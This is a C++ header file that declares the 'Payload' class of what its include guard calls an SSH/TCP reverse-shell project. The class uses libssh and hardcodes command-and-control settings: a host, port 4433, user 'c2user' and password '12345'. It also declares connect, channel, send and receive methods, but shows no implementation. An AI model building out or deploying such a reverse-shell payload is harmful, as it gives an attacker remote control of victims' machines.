//
// Created by rip on 6/30/19.
//

#ifndef SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H
#define SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H

#include <iostream>
#include "libssh/libssh.h"

class Payload {

private:
    ssh_session session;
    ssh_channel channel;
    const std::string host { "127.0.0.1" };
    const int port { 4433 };
    const std::string user { "c2user" };
    const std::string pwd { "12345" };

    void handleConnection();
    void tearDown();
    bool openChannel();
    void sendMsg(const std::string&);
    std::string rcvMsg();

public:
    Payload();
    ~Payload();

    void connect();

};


#endif //SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H